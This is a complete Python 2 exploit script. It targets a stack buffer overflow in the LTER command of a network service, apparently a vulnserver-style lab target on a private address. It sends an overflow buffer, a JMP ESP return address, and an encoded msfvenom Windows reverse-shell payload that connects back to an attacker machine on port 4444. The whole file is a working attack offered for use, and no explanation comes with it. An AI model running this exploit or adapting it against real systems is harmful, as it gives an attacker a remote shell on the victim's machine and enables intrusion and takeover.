#!/usr/bin/python

import socket
import os
import sys

host = "192.168.5.96"
port = 9999

offset = 2003
length = 3000

buffer = "A" * offset
# 0x62501205 = JMP ESP
buffer += "\x05\x12\x50\x62"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.5.97 LPORT=4444 -f py -e x86/alpha_mixed BufferRegister=ESP
buf =  ""
buf += "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += "\x6b\x4c\x68\x68\x6c\x42\x43\x30\x37\x70\x57\x70\x61"
buf += "\x70\x6c\x49\x6d\x35\x34\x71\x6f\x30\x42\x44\x4c\x4b"
buf += "\x70\x50\x44\x70\x6c\x4b\x70\x52\x36\x6c\x6c\x4b\x70"
buf += "\x52\x65\x44\x6e\x6b\x43\x42\x77\x58\x36\x6f\x4c\x77"
buf += "\x43\x7a\x65\x76\x74\x71\x59\x6f\x6c\x6c\x75\x6c\x53"
buf += "\x51\x43\x4c\x75\x52\x56\x4c\x35\x70\x4a\x61\x5a\x6f"
buf += "\x64\x4d\x43\x31\x7a\x67\x48\x62\x6c\x32\x62\x72\x62"
buf += "\x77\x4e\x6b\x42\x72\x46\x70\x6e\x6b\x53\x7a\x57\x4c"
buf += "\x6e\x6b\x70\x4c\x44\x51\x43\x48\x48\x63\x57\x38\x53"
buf += "\x31\x48\x51\x53\x61\x4c\x4b\x62\x79\x37\x50\x37\x71"
buf += "\x78\x53\x6e\x6b\x61\x59\x42\x38\x6b\x53\x67\x4a\x42"
buf += "\x69\x4e\x6b\x37\x44\x4c\x4b\x75\x51\x4b\x66\x65\x61"
buf += "\x39\x6f\x6c\x6c\x69\x51\x7a\x6f\x46\x6d\x76\x61\x78"
buf += "\x47\x56\x58\x39\x70\x64\x35\x39\x66\x67\x73\x63\x4d"
buf += "\x68\x78\x45\x6b\x31\x6d\x66\x44\x62\x55\x4b\x54\x62"
buf += "\x78\x6c\x4b\x50\x58\x56\x44\x33\x31\x58\x53\x42\x46"
buf += "\x4c\x4b\x54\x4c\x32\x6b\x4c\x4b\x46\x38\x57\x6c\x56"
buf += "\x61\x6a\x73\x4c\x4b\x64\x44\x4c\x4b\x65\x51\x48\x50"
buf += "\x6d\x59\x31\x54\x64\x64\x76\x44\x71\x4b\x33\x6b\x45"
buf += "\x31\x66\x39\x73\x6a\x73\x61\x6b\x4f\x79\x70\x71\x4f"
buf += "\x43\x6f\x31\x4a\x4c\x4b\x45\x42\x6a\x4b\x4c\x4d\x31"
buf += "\x4d\x73\x58\x67\x43\x76\x52\x47\x70\x55\x50\x73\x58"
buf += "\x53\x47\x43\x43\x65\x62\x73\x6f\x36\x34\x55\x38\x52"
buf += "\x6c\x30\x77\x56\x46\x44\x47\x49\x6f\x6e\x35\x78\x38"
buf += "\x4e\x70\x66\x61\x55\x50\x35\x50\x65\x79\x6f\x34\x66"
buf += "\x34\x46\x30\x55\x38\x34\x69\x6d\x50\x50\x6b\x35\x50"
buf += "\x79\x6f\x4a\x75\x30\x50\x52\x70\x62\x70\x66\x30\x61"
buf += "\x50\x36\x30\x31\x50\x62\x70\x33\x58\x4a\x4a\x46\x6f"
buf += "\x4b\x6f\x79\x70\x69\x6f\x4a\x75\x4a\x37\x32\x4a\x34"
buf += "\x45\x30\x68\x49\x50\x4f\x58\x57\x75\x51\x71\x65\x38"
buf += "\x37\x72\x63\x30\x77\x61\x53\x6c\x4c\x49\x4a\x46\x31"
buf += "\x7a\x44\x50\x53\x66\x36\x37\x50\x68\x6e\x79\x59\x35"
buf += "\x64\x34\x63\x51\x4b\x4f\x4b\x65\x4c\x45\x6f\x30\x50"
buf += "\x74\x76\x6c\x69\x6f\x42\x6e\x66\x68\x63\x45\x38\x6c"
buf += "\x55\x38\x6c\x30\x38\x35\x4d\x72\x30\x56\x69\x6f\x38"
buf += "\x55\x61\x78\x62\x43\x32\x4d\x45\x34\x67\x70\x6b\x39"
buf += "\x6b\x53\x56\x37\x33\x67\x36\x37\x50\x31\x5a\x56\x30"
buf += "\x6a\x64\x52\x61\x49\x73\x66\x5a\x42\x4b\x4d\x55\x36"
buf += "\x58\x47\x37\x34\x77\x54\x45\x6c\x56\x61\x77\x71\x4c"
buf += "\x4d\x61\x54\x31\x34\x32\x30\x6a\x66\x67\x70\x51\x54"
buf += "\x61\x44\x76\x30\x56\x36\x33\x66\x62\x76\x52\x66\x53"
buf += "\x66\x30\x4e\x53\x66\x62\x76\x62\x73\x71\x46\x70\x68"
buf += "\x32\x59\x5a\x6c\x57\x4f\x4c\x46\x4b\x4f\x59\x45\x4d"
buf += "\x59\x39\x70\x42\x6e\x51\x46\x72\x66\x79\x6f\x70\x30"
buf += "\x52\x48\x57\x78\x6e\x67\x45\x4d\x35\x30\x69\x6f\x39"
buf += "\x45\x6f\x4b\x6c\x30\x68\x35\x6d\x72\x76\x36\x71\x78"
buf += "\x4f\x56\x7a\x35\x4f\x4d\x4f\x6d\x79\x6f\x4a\x75\x55"
buf += "\x6c\x66\x66\x31\x6c\x45\x5a\x6b\x30\x6b\x4b\x79\x70"
buf += "\x73\x45\x33\x35\x6f\x4b\x32\x67\x75\x43\x34\x32\x30"
buf += "\x6f\x50\x6a\x65\x50\x71\x43\x39\x6f\x6e\x35\x41\x41"

buffer += buf

buffer += "B" * (length - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host,port))

print s.recv(1024)

print "[+] Sending exploit..."

s.send("LTER /.:/" + buffer)

print s.recv(1024)

s.close()